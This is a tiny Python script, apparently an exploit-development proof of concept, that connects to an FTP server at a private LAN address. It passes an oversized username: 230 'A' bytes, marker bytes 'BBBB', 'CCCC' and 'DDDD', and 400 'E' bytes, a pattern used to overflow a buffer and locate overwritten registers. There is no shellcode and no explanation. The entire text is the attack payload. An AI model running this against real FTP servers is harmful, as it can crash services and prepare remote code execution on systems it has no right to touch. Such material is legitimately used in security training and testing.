import ftplib
buffer="A" * 230
buffer=buffer+"BBBB"
buffer=buffer+"CCCC"
buffer=buffer+"DDDD"
buffer=buffer+"E"*400
ftp = ftplib.FTP('192.168.0.100', buffer, 'test')
